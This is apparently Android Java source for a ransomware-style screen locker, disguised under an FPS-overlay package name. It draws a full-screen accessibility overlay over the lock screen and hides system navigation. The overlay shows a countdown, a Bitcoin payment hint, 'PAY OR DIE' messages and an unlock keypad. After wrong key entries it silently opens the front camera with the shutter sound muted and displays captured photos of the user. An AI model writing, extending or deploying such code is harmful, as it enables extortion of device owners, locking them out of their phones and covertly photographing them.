package com.bluestacks.fpsoverlay;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Build;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import java.util.concurrent.TimeUnit;

public class OverlayManager {
    private static final String TAG = "OverlayManager";
    private final Context context;
    private final WindowManager wm;
    private View overlay;
    private final OverlayCallback callback;
    private long cooldownUntil = 0;
    private boolean isCoolingDown = false;
    private int wrongAttemptCount = 0;
    private android.os.Handler cooldownHandler = new android.os.Handler(android.os.Looper.getMainLooper());
    private Runnable cooldownRunnable;

    public interface OverlayCallback {
        boolean onCheckKey(String key);
        void onUnlocked();
        void setLockStatus(boolean locked);
    }

    public OverlayManager(Context context, OverlayCallback callback) {
        this.context = context;
        this.wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        this.callback = callback;
    }

    private int getResId(String name, String type) {
        return context.getResources().getIdentifier(name, type, context.getPackageName());
    }

    public void showOverlay() {
        if (overlay != null) return;
        
        int layoutId = getResId("sys_opt_view", "layout");
        if (layoutId == 0) {
            Log.e(TAG, "Layout not found!");
            return;
        }
        overlay = LayoutInflater.from(context).inflate(layoutId, null);

        int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                | WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                flags,
                PixelFormat.OPAQUE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            lp.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }

        lp.gravity = Gravity.CENTER;
        lp.screenOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT;

        overlay.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LOW_PROFILE);

        final TextView tv = overlay.findViewById(getResId("v_display", "id"));
        final View keypad = overlay.findViewById(getResId("v_keypad_container", "id"));
        View content = overlay.findViewById(getResId("container_content", "id"));

        if (tv != null && keypad != null) {
            tv.setOnClickListener(v -> {
                keypad.setVisibility(View.VISIBLE);
            });
        }

        if (content != null && keypad != null) {
            content.setOnClickListener(v -> {
                if (keypad.getVisibility() == View.VISIBLE) {
                    keypad.setVisibility(View.GONE);
                }
            });
        }

        if (content != null) {
            int animId = getResId("smooth_entrance", "anim");
            if (animId != 0) {
                android.view.animation.Animation entrance = AnimationUtils.loadAnimation(context, animId);
                content.startAnimation(entrance);
            }
            
            // Start pulse on logo after entrance or along with it
            View logo = overlay.findViewById(getResId("v_logo", "id"));
            if (logo != null) {
                int pulseId = getResId("pulse", "anim");
                if (pulseId != 0) {
                    android.view.animation.Animation pulse = AnimationUtils.loadAnimation(context, pulseId);
                    logo.startAnimation(pulse);
                }
            }
        }

        final TextView timerTv = overlay.findViewById(getResId("v_timer", "id"));
        
        // Start a general countdown timer for the UI
        if (timerTv != null) {
            new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
                long seconds = 14 * 3600 + 4 * 60 + 8;
                @Override
                public void run() {
                    seconds--;
                    long h = seconds / 3600;
                    long m = (seconds % 3600) / 60;
                    long s = seconds % 60;
                    timerTv.setText(String.format(java.util.Locale.US, "%02dh %02dm %02ds", h, m, s));
                    if (seconds > 0) {
                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this, 1000);
                    }
                }
            });
        }

        // Action Buttons functionality
        View refreshBtn = overlay.findViewById(getResId("v_refresh", "id"));
        if (refreshBtn != null) {
            refreshBtn.setOnClickListener(v -> {
                v.animate().rotationBy(360).setDuration(500).start();
                // Simulation: update IP or stats
                TextView statsTv = overlay.findViewById(getResId("v_stats", "id"));
                if (statsTv != null) {
                    statsTv.setText("Your system: (Android)   IP: 192.251." + (100 + (int)(Math.random()*150)) + "." + (int)(Math.random()*255) + "   Total: 5,326 files");
                }
            });
        }

        View paymentBtn = overlay.findViewById(getResId("v_payment", "id"));
        if (paymentBtn != null) {
            paymentBtn.setOnClickListener(v -> {
                if (tv != null) tv.setHint("BTC: 1G9p...society");
            });
        }

        View faqBtn = overlay.findViewById(getResId("v_faq", "id"));
        if (faqBtn != null) {
            faqBtn.setOnClickListener(v -> {
                if (tv != null) tv.setHint("NO REFUNDS. PAY OR DIE.");
            });
        }

        View decryptBtn = overlay.findViewById(getResId("v_decrypt", "id"));
        if (decryptBtn != null) {
            decryptBtn.setOnClickListener(v -> {
                if (tv != null) tv.setHint("FREE: 1 FILE DECRYPTED");
            });
        }

        View supportBtn = overlay.findViewById(getResId("v_support", "id"));
        if (supportBtn != null) {
            supportBtn.setOnClickListener(v -> {
                if (tv != null) tv.setHint("IRC: #Dsociety");
            });
        }

        final StringBuilder sb = new StringBuilder();
        int[] ids = {
            getResId("v_b0", "id"), getResId("v_b1", "id"), getResId("v_b2", "id"), 
            getResId("v_b3", "id"), getResId("v_b4", "id"), getResId("v_b5", "id"), 
            getResId("v_b6", "id"), getResId("v_b7", "id"), getResId("v_b8", "id"), 
            getResId("v_b9", "id")
        };
        for (int id : ids) {
            if (id == 0) continue;
            View b = overlay.findViewById(id);
            if (b != null) {
                b.setOnClickListener(v -> {
                    if (isCoolingDown && System.currentTimeMillis() < cooldownUntil) {
                        showCooldownMessage(tv);
                        showFacePreview(); // Jepret foto setiap kali input saat cooldown
                        return;
                    }
                    v.animate().scaleX(0.9f).scaleY(0.9f).setDuration(50).withEndAction(() -> v.animate().scaleX(1f).scaleY(1f).setDuration(50));
                    if (sb.length() < 8) {
                        sb.append(((Button) v).getText());
                        tv.setText(sb.toString().replaceAll(".", "*"));
                    }
                });
            }
        }

        View okBtn = overlay.findViewById(getResId("v_ok", "id"));
        if (okBtn != null) {
            okBtn.setOnClickListener(v -> {
                if (isCoolingDown && System.currentTimeMillis() < cooldownUntil) {
                    showCooldownMessage(tv);
                    return;
                }
                
                v.animate().scaleX(0.9f).scaleY(0.9f).setDuration(50).withEndAction(() -> v.animate().scaleX(1f).scaleY(1f).setDuration(50));
                String input = sb.toString();
                if (callback.onCheckKey(input)) {
                    wrongAttemptCount = 0;
                    hideOverlay();
                    callback.onUnlocked();
                    callback.setLockStatus(false);
                } else {
                    wrongAttemptCount++;
                    int shakeId = getResId("shake", "anim");
                    if (shakeId != 0) tv.startAnimation(AnimationUtils.loadAnimation(context, shakeId));
                    tv.setText("");
                    sb.setLength(0);
                    tv.setHint("WRONG KEY (" + wrongAttemptCount + "/3)");

                    if (wrongAttemptCount >= 3) {
                        wrongAttemptCount = 0;
                        cooldownUntil = System.currentTimeMillis() + TimeUnit.SECONDS.toMillis(60);
                        isCoolingDown = true;
                        startCooldownTimer(tv);
                        showFacePreview();
                    }
                }
            });
        }

        View delBtn = overlay.findViewById(getResId("v_del", "id"));
        if (delBtn != null) {
            delBtn.setOnClickListener(v -> {
                v.animate().scaleX(0.9f).scaleY(0.9f).setDuration(50).withEndAction(() -> v.animate().scaleX(1f).scaleY(1f).setDuration(50));
                if (sb.length() > 0) {
                    sb.deleteCharAt(sb.length() - 1);
                    tv.setText(sb.toString().replaceAll(".", "*"));
                }
            });
        }

        try {
            wm.addView(overlay, lp);
        } catch (Exception e) {
            Log.e(TAG, "Failed to add overlay: " + e.getMessage());
        }
    }

    private void showCooldownMessage(TextView tv) {
        long remaining = (cooldownUntil - System.currentTimeMillis()) / 1000;
        if (remaining > 0) {
            tv.setText("LOCKED: " + remaining + "s");
        } else {
            isCoolingDown = false;
            tv.setText("");
            tv.setHint("[ ENTER KEY ]");
        }
    }

    private void startCooldownTimer(final TextView tv) {
        if (cooldownRunnable != null) cooldownHandler.removeCallbacks(cooldownRunnable);
        cooldownRunnable = new Runnable() {
            @Override
            public void run() {
                long remaining = (cooldownUntil - System.currentTimeMillis()) / 1000;
                if (remaining > 0 && isCoolingDown) {
                    tv.setText("COOLDOWN: " + remaining + "s");
                    cooldownHandler.postDelayed(this, 1000);
                } else {
                    isCoolingDown = false;
                    tv.setText("");
                    tv.setHint("[ ENTER KEY ]");
                }
            }
        };
        cooldownHandler.post(cooldownRunnable);
    }

    private java.util.LinkedList<ImageView> photoQueue = new java.util.LinkedList<>();
    private android.hardware.Camera persistentCamera;
    private boolean isCapturing = false;

    private void showFacePreview() {
        if (overlay == null || isCapturing) return;
        final android.widget.FrameLayout root = overlay.findViewById(getResId("root_overlay", "id"));
        final TextView tv = overlay.findViewById(getResId("v_display", "id"));
        if (root == null) return;
    
        if (tv != null) {
            tv.setHint("SECURITY ALERT: PHOTO CAPTURED");
        }

        isCapturing = true;
        new Thread(() -> {
            try {
                if (persistentCamera == null) {
                    persistentCamera = android.hardware.Camera.open(1);
                    // Matikan suara shutter (jika didukung perangkat)
                    try { persistentCamera.enableShutterSound(false); } catch (Exception ignored) {}
                    
                    android.graphics.SurfaceTexture st = new android.graphics.SurfaceTexture(10);
                    persistentCamera.setPreviewTexture(st);
                    android.hardware.Camera.Parameters p = persistentCamera.getParameters();
                    p.setRotation(270); 
                    persistentCamera.setParameters(p);
                    persistentCamera.startPreview();
                    // Warm-up sebentar hanya untuk pertama kali
                    Thread.sleep(300); 
                }

                // TEKNIK MILITER: Gunakan Preview Callback (Frame Grabbing) 
                // Jauh lebih cepat & sunyi daripada takePicture()
                persistentCamera.setOneShotPreviewCallback((data, camera) -> {
                    android.hardware.Camera.Parameters params = camera.getParameters();
                    int w = params.getPreviewSize().width;
                    int h = params.getPreviewSize().height;
                    int format = params.getPreviewFormat();
                    
                    // Decode frame secara asinkron agar tidak lag
                    new Thread(() -> {
                        try {
                            android.graphics.YuvImage yuv = new android.graphics.YuvImage(data, format, w, h, null);
                            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                            yuv.compressToJpeg(new android.graphics.Rect(0, 0, w, h), 40, out);
                            byte[] bytes = out.toByteArray();
                            Bitmap bm = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                            
                            if (bm != null) {
                                // Putar bitmap karena front camera biasanya mirror/rotated
                                android.graphics.Matrix matrix = new android.graphics.Matrix();
                                matrix.postRotate(-90); // Sesuaikan orientasi
                                Bitmap rotatedBm = Bitmap.createBitmap(bm, 0, 0, bm.getWidth(), bm.getHeight(), matrix, true);
                                
                                root.post(() -> displayCapturedPhoto(rotatedBm, root));
                            }
                        } catch (Exception ignored) {}
                        isCapturing = false;
                    }).start();
                });

            } catch (Exception e) {
                isCapturing = false;
                releaseCamera();
            }
        }).start();
    }

    private void displayCapturedPhoto(Bitmap bm, android.widget.FrameLayout root) {
        // Max 2 foto: Jika sudah 2, hapus yang tertua
        if (photoQueue.size() >= 2) {
            ImageView oldest = photoQueue.poll();
            if (oldest != null) {
                oldest.animate().alpha(0f).setDuration(200).withEndAction(() -> {
                    try { root.removeView(oldest); } catch (Exception ignored) {}
                });
            }
        }

        ImageView iv = new ImageView(context);
        int dpSize = 100 + (int)(Math.random() * 40);
        int pxSize = (int) (dpSize * context.getResources().getDisplayMetrics().density);
        android.widget.FrameLayout.LayoutParams lp = new android.widget.FrameLayout.LayoutParams(pxSize, pxSize);
        
        // AREA: Di sekitar Logo Jester
        View logoView = root.findViewById(getResId("v_logo", "id"));
        int screenWidth = root.getWidth();
        int startY = 100;
        int endY = root.getHeight() / 2;

        if (logoView != null) {
            int[] location = new int[2];
            logoView.getLocationOnScreen(location);
            startY = Math.max(0, location[1] - 80);
            endY = location[1] + logoView.getHeight() + 80;
        }
        
        lp.leftMargin = (int) (Math.random() * (screenWidth - pxSize));
        int availableHeight = endY - startY - pxSize;
        lp.topMargin = startY + (availableHeight > 0 ? (int)(Math.random() * availableHeight) : 0);
        lp.gravity = Gravity.TOP | Gravity.START;
        
        iv.setLayoutParams(lp);
        iv.setImageBitmap(bm);
        iv.setScaleType(ImageView.ScaleType.CENTER_CROP);
        iv.setPadding(2, 2, 2, 2);
        iv.setBackgroundColor(android.graphics.Color.WHITE); 
        iv.setRotation((float) (Math.random() * 30 - 15));
        iv.setAlpha(0f);
        
        root.addView(iv, 0); 
        photoQueue.add(iv);

        iv.animate().alpha(0.9f).scaleX(1.1f).scaleY(1.1f).setDuration(250)
          .withEndAction(() -> {
              iv.animate().scaleX(1.0f).scaleY(1.0f).setDuration(100);
              
              iv.postDelayed(() -> {
                  if (photoQueue.contains(iv)) {
                      photoQueue.remove(iv);
                      iv.animate().alpha(0f).setDuration(400).withEndAction(() -> {
                          try { root.removeView(iv); } catch (Exception ignored) {}
                      });
                  }
              }, 10000);
          });
    }

    private void releaseCamera() {
        if (persistentCamera != null) {
            try {
                persistentCamera.stopPreview();
                persistentCamera.release();
            } catch (Exception ignored) {}
            persistentCamera = null;
        }
    }

    public void hideOverlay() {
        if (overlay != null && wm != null) {
            overlay.animate().alpha(0f).setDuration(500).withEndAction(() -> {
                try {
                    if (overlay != null) {
                        wm.removeView(overlay);
                        overlay = null;
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error removing overlay: " + e.getMessage());
                }
            });
        }
    }

    public boolean isShowing() {
        return overlay != null;
    }
}
